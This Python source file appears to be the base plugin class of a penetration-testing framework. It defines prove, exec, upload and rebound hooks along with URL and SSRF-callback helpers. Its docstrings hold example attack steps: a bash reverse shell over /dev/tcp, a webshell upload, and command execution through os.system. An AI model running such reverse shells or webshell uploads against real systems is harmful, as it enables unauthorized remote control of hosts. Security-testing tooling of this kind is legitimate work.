#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

import os
import socket
import urllib.parse
from lib.api.api import _ceye_dns_api
from lib.api.api import _ceye_verify_api
from lib.core.data import logger
from lib.utils.curl import curl
from lib.utils.curl import geturl
from lib.core.enums import SERVICE_PORT_MAP

class Script(object):
    def __init__(self, target=None, service_type=SERVICE_PORT_MAP.WEB, priority=5):
        self.service_type = service_type

        # in dev ...
        # self.script_type = script_type

        self.target = target
        self.priority = priority
        self.parameter = {}
        self.url = self.base_url = None
        self.req = []
        self.res = []
        self.other = {}

    def prove(self):
        """subclass should override this function for prove
            demo:
                if vul:
                    self.flag = 1
                    self.req.append({"test": test})                     # for recode the request' info to database
                    self.res.append({"info": test, "key": "test"})      # for recode the response' info to database and show info, key to console.
        """
        raise AttributeError('Function is not exist.')

    def exec(self):
        """subclass should override this function for exec
            use self.parameter['cmd'] by -p cmd=whoami
            demo:
                res = os.system(self.parameter['cmd'])
                if vul:
                    self.flag = 1
                    self.req.append({"test": test})                      # for recode the request' info to database
                    self.res.append({"info": test, "key": "test"})       # for recode the response' info to database and show info, key to console.
        """
        raise AttributeError('Function is not exist.')

    def upload(self):
        """subclass should override this function for upload
            use self.parameter['srcpath'] and self.parameter['despath'] by -p srcpath=webshell.jsp&despath=test.jsp
            demo:
                srcpath = self.parameter['srcpath']
                despath = self.parameter['despath']
                ... upload srcpath to despath...
                if vul:
                    self.flag = 1
                    self.req.append({"test": srcpath})                # for recode the request' info to database
                    self.res.append({"info": despath, "key": "test"}) # for recode the response' info to database and show info, key to console.
        """
        raise AttributeError('Function is not exist.')

    def rebound(self):
        """subclass should override this function for upload
            use self.parameter['local_host'] and self.parameter['local_port'] by -p local_host=192.168.1.3&local_port=4444
            demo:
                local_host = self.parameter['local_host']
                local_port = self.parameter['local_port']
                cmd = '/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1'.format(ip=local_host, port=local_port)
                res = os.system(cmd)
                if vul:
                    self.flag = 1
                    self.req.append({"test": cmd})                      # for recode the request' info to database
                    self.res.append({"info": 'success', "key": "test"}) # for recode the response' info to database and show info, key to console.
        """
        raise AttributeError('Function is not exist.')

    def get_url(self):
        if not self.url:
            self.base_url = self.url = geturl(self.target_host, self.target_port)

    def initialize(self,host, port, url, parameter):
        self.target_host = host
        self.target_port = port
        self.parameter = parameter
        if url != None and len(url) > 9:
            _ = url[9:].find('/')
            if _ == -1 :
                url += '/'
                self.base_url = self.url = url
            else:
                self.url = url
                self.base_url = self.url[:_ + 10]

        self.flag = -1
        self.req = []
        self.res = []
        self.other = {}

    def curl(self, method, url, **kwargs):
        return curl(method, url , **kwargs)


    def read_file(self, filename, type = 'r'):
        if os.path.isfile(filename):
            with open(filename, type) as f:
                return f.readlines()
        logger.error("File is not exist: %s" %filename)
        return None

    def ceye_dns_api(self, t='url'):
        '''
        curl ssrf
        :param t:
        :return:
        '''
        return _ceye_dns_api(t=t)

    def ceye_verify_api(self, filter, t='dns'):
        '''
        verify ssrf
        :param filter:
        :param t:
        :return:
        '''
        return _ceye_verify_api(filter=filter, t=t)

    def url_normpath(self, base, url):
        from urllib.parse import urljoin
        from urllib.parse import urlparse
        from urllib.parse import urlunparse
        from posixpath import normpath
        url1 = urljoin(base, url)
        arr = urlparse(url1)
        path = normpath(arr[2])
        return urlunparse((arr.scheme, arr.netloc, path, arr.params, arr.query, arr.fragment))
